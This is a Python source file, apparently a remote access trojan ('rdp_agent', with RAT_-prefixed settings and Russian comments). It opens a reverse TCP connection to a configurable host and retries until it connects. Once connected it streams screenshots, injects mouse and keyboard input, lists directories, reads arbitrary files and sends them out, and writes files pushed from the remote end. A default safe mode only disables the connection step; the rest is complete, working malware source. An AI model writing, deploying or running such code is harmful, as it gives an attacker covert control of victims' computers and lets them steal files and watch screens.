# language: Python, file: rdp_agent.py
# *reverse TCP; в SAFE_MODE (env RAT_SAFE=1) не подключается, только логирует*
import os, sys, socket, struct, json, io, threading, time, base64
import pyautogui
from PIL import ImageGrab

HOST = os.getenv("RAT_HOST", "127.0.0.1")
PORT = int(os.getenv("RAT_PORT", "5555"))
SAFE = os.getenv("RAT_SAFE", "1") == "1"
MAGIC = b"RDP1"

def send_msg(sock, obj, lock):
    data = json.dumps(obj).encode()
    with lock:
        sock.sendall(struct.pack("!I", len(data)) + data)

def recv_msg(sock):
    hdr = sock.recv(4)
    if not hdr:
        return None
    n = struct.unpack("!I", hdr)[0]
    if n > 20_000_000:
        return None
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    try:
        return json.loads(buf)
    except Exception:
        return None

def screen_loop(sock, lock):
    while True:
        try:
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, "JPEG", quality=55)
            send_msg(sock, {"t": "screen", "w": img.width, "h": img.height,
                            "d": base64.b64encode(buf.getvalue()).decode()}, lock)
            time.sleep(0.1)
        except Exception:
            time.sleep(1)

def input_loop(sock, lock):
    while True:
        msg = recv_msg(sock)
        if not msg:
            break
        t = msg.get("t")
        try:
            if t == "mouse":
                pyautogui.moveTo(msg["x"], msg["y"], duration=0)
                if msg.get("click"):
                    pyautogui.click(button=msg.get("button", "left"),
                                    clicks=int(msg.get("clicks", 1)), interval=0.05)
            elif t == "scroll":
                pyautogui.scroll(msg["dy"])
            elif t == "key":
                k = msg.get("key")
                if msg.get("down"):
                    pyautogui.keyDown(k)
                else:
                    pyautogui.keyUp(k)
            elif t == "type":
                text = msg["text"]
                if text.isascii():
                    pyautogui.write(text, interval=0.01)
                else:
                    import pyperclip
                    pyperclip.copy(text)
                    pyautogui.hotkey("ctrl", "v")
            elif t == "list":
                path = msg.get("path", os.path.expanduser("~"))
                items = []
                try:
                    for n in os.listdir(path):
                        full = os.path.join(path, n)
                        try:
                            items.append({"name": n, "dir": os.path.isdir(full),
                                          "size": os.path.getsize(full)})
                        except OSError:
                            continue
                except OSError as e:
                    send_msg(sock, {"t": "err", "msg": str(e)}, lock)
                    continue
                send_msg(sock, {"t": "list", "path": path, "items": items}, lock)
            elif t == "get":
                path = msg["path"]
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    send_msg(sock, {"t": "file", "path": path,
                                    "d": base64.b64encode(data).decode()}, lock)
                except OSError as e:
                    send_msg(sock, {"t": "err", "msg": str(e)}, lock)
            elif t == "put":
                with open(msg["path"], "wb") as f:
                    f.write(base64.b64decode(msg["d"]))
                send_msg(sock, {"t": "ok"}, lock)
        except Exception as e:
            send_msg(sock, {"t": "err", "msg": str(e)}, lock)

def main():
    lock = threading.Lock()
    if SAFE:
        print("[rdp_agent] SAFE_MODE: не подключаюсь. Поставь RAT_SAFE=0 для реального режима.")
        return
    while True:
        try:
            s = socket.create_connection((HOST, PORT), timeout=10)
            s.sendall(MAGIC)
            break
        except OSError as e:
            print(f"[rdp_agent] retry in 15s: {e}")
            time.sleep(15)
    threading.Thread(target=screen_loop, args=(s, lock), daemon=True).start()
    input_loop(s, lock)

if __name__ == "__main__":
    main()
